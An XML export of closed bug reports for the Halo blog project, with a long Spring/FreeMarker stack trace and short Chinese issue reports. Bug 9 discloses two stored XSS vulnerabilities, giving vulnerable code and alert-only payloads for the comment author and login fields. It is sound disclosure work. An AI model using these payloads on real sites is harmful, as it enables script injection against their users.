org.springframework.web.servlet.support.RequestContext.getMessage(RequestContext.java:703) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.support.RequestContext.getMessage(RequestContext.java:669) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at sun.reflect.GeneratedMethodAccessor117.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_151] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_151] at freemarker.ext.beans.BeansWrapper.invokeMethod(BeansWrapper.java:1505) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.ReflectionCallableMemberDescriptor.invokeMethod(ReflectionCallableMemberDescriptor.java:56) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.MemberAndArguments.invokeMethod(MemberAndArguments.java:51) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.OverloadedMethodsModel.exec(OverloadedMethodsModel.java:61) ~[freemarker-2.3.28.jar:2.3.28] ... 67 common frames omitted  2018-11-23 16:16:52.322 ERROR 9032 --- [ XNIO-5 task-33] io.undertow.request                      : UT005023: Exception handling request to /admin/posts/new  org.springframework.web.util.NestedServletException: Request processing failed; nested exception is freemarker.core._TemplateModelException: Java method "org.springframework.web.servlet.support.RequestContext.getMessage(String)" threw an exception when invoked on org.springframework.web.servlet.support.RequestContext object "org.springframework.web.servlet.support.RequestContext@68cd760b"; see cause exception in the Java stack trace.  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${springMacroRequestContext.getMessag...  [in template "spring.ftl" in macro "message" at line 28, column 22] - Reached through: @spring.message code=" common.js.all-...  [in template "admin/admin_post_md_editor.ftl" at line 234, column 132] ---- at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:890) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) ~[javax.servlet-api-4.0.1.jar:4.0.1] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:875) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) ~[javax.servlet-api-4.0.1.jar:4.0.1] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) ~[spring-web-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-5.1.2.RELEASE.jar:5.1.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119) ~[undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:360) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_151] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_151] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_151] Caused by: freemarker.core._TemplateModelException: Java method "org.springframework.web.servlet.support.RequestContext.getMessage(String)" threw an exception when invoked on org.springframework.web.servlet.support.RequestContext object "org.springframework.web.servlet.support.RequestContext@68cd760b"; see cause exception in the Java stack trace.  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${springMacroRequestContext.getMessag...  [in template "spring.ftl" in macro "message" at line 28, column 22] - Reached through: @spring.message code=" common.js.all-...  [in template "admin/admin_post_md_editor.ftl" at line 234, column 132] ---- at freemarker.ext.beans._MethodUtil.newInvocationTemplateModelException(_MethodUtil.java:289) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans._MethodUtil.newInvocationTemplateModelException(_MethodUtil.java:261) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.OverloadedMethodsModel.exec(OverloadedMethodsModel.java:65) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.MethodCall._eval(MethodCall.java:65) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Expression.eval(Expression.java:83) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.BuiltInsForOutputFormatRelated$AbstractConverterBI.calculateResult(BuiltInsForOutputFormatRelated.java:50) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.MarkupOutputFormatBoundBuiltIn._eval(MarkupOutputFormatBoundBuiltIn.java:40) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Expression.eval(Expression.java:83) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:366) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.invoke(Environment.java:775) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.UnifiedCall.accept(UnifiedCall.java:83) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:330) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:372) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visitAndTransform(Environment.java:495) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.CompressedBlock.accept(CompressedBlock.java:42) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:330) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:336) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.process(Environment.java:309) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.template.Template.process(Template.java:384) ~[freemarker-2.3.28.jar:2.3.28] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.processTemplate(FreeMarkerView.java:389) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.doRender(FreeMarkerView.java:302) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.renderMergedTemplateModel(FreeMarkerView.java:253) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:178) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:316) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1370) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1116) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:998) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] ... 39 common frames omitted Caused by: org.springframework.context.NoSuchMessageException: No message found under code ' common.js.all-attachment' for locale 'zh_CN'. at org.springframework.context.support.AbstractMessageSource.getMessage(AbstractMessageSource.java:161) ~[spring-context-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.context.support.AbstractApplicationContext.getMessage(AbstractApplicationContext.java:1277) ~[spring-context-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.support.RequestContext.getMessage(RequestContext.java:703) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.support.RequestContext.getMessage(RequestContext.java:669) ~[spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at sun.reflect.GeneratedMethodAccessor117.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_151] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_151] at freemarker.ext.beans.BeansWrapper.invokeMethod(BeansWrapper.java:1505) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.ReflectionCallableMemberDescriptor.invokeMethod(ReflectionCallableMemberDescriptor.java:56) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.MemberAndArguments.invokeMethod(MemberAndArguments.java:51) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.OverloadedMethodsModel.exec(OverloadedMethodsModel.java:61) ~[freemarker-2.3.28.jar:2.3.28] ... 67 common frames omitted  </body>
		<created>2018-11-23 08:17:40</created>
		<closed>2018-11-23 12:54:18</closed>
	</bug>
	<bug>
		<id>51</id>
		<title>主题有问题</title>
		<body>vno主题的设置功能报错，大佬</body>
		<created>2018-11-22 09:22:13</created>
		<closed>2018-12-04 02:36:19</closed>
	</bug>
	<bug>
		<id>43</id>
		<title>User-Agent过长会导致插入失败</title>
		<body>![tim 20181108180154](https://user-images.githubusercontent.com/22869648/48191570-65eab600-e380-11e8-9ba2-a8d111db016f.png) </body>
		<created>2018-11-08 10:02:17</created>
		<closed>2018-11-10 01:32:55</closed>
	</bug>
	<bug>
		<id>25</id>
		<title>打包成Jar后路径访问问题</title>
		<body>在Ubuntu18.04部署的过程中，发现ResourceUtil.getURL获取的basePath为`/home/jiuming/halo/target/dist/halo/halo-lastest.jar!/META-INF/...`，`new File(basePath,FileName)`的路径为`/home/jiuming/file:/home/jiuming/halo/target/dist/halo/halo-lastest.jar!/META-INF/...`无法获取文件路径(因为jar包本身是一个文件，无法获得内部目录)，没有找到解决方案，有相似问题的可以考虑在部署的时候使用`mvn spring-boot:run`的方式启动项目(在项目根目录下)</body>
		<created>2018-07-22 04:34:24</created>
		<closed>2018-09-27 13:57:46</closed>
	</bug>
	<bug>
		<id>22</id>
		<title>启动端口8090</title>
		<body>一个不影响使用的小问题，更改为8080后仍旧提示从`Halo started at http://localhost:8090`</body>
		<created>2018-07-19 15:36:59</created>
		<closed>2018-07-20 06:16:12</closed>
	</bug>
	<bug>
		<id>17</id>
		<title>文章自动保存草稿定时器没有关闭</title>
		<body>定时器没有关闭导致一直执行</body>
		<created>2018-07-02 01:28:22</created>
		<closed>2018-09-27 13:58:00</closed>
	</bug>
	<bug>
		<id>16</id>
		<title>报了小bug</title>
		<body>额，怎么说呢，，，当发布后文章被移如回收站或草稿箱时，虽然不会在首页上看到，但依旧能通过原来的链接访问到，这应该算是bug了吧，，， </body>
		<created>2018-06-28 17:14:01</created>
		<closed>2018-06-29 02:08:42</closed>
	</bug>
	<bug>
		<id>9</id>
		<title>These are two stored xss vulnerability</title>
		<body>## The first place  &gt; The front comment `commentAuthor` field is not strictly filtered  ### Vulnerability code &gt; FrontCommentController.java ``` comment.setCommentAuthorEmail(comment.getCommentAuthorEmail().toLowerCase()); comment.setPost(post); comment.setCommentDate(new Date()); comment.setCommentAuthorIp(HaloUtil.getIpAddr(request)); comment.setIsAdmin(0); commentService.saveByComment(comment); ```  ### Payload `a" onclick="alert(/xss/)`  ----- # Second place  &gt; When login failed at the background, the failed login username and password are written to the log without xss filtering, and displayed on the background home page, resulting in storage xss vulnerability.  ### Vulnerability code &gt; AdminController.java ``` try {             User aUser = userService.findUser();             ...         } catch (Exception e) {             Integer errorCount = userService.updateUserLoginError();             if (errorCount &gt;= 5) {                 userService.updateUserLoginEnable("false");             }             userService.updateUserLoginLast(new Date());             logsService.saveByLogs(new Logs(LogsRecord.LOGIN, LogsRecord.LOGIN_ERROR + "[" + loginName + "," + loginPwd + "]", HaloUtil.getIpAddr(request), new Date()));             log.error("登录失败！：{0}", e.getMessage());         } ```  ### Payload ``` loginName=admin&amp;loginPwd=admin&lt;a href="javascript:alert(/xss/);"&gt;xss&lt;/a&gt; ``` </body>
		<created>2018-05-11 09:43:02</created>
		<closed>2018-05-31 05:49:15</closed>
	</bug>
</bugs>
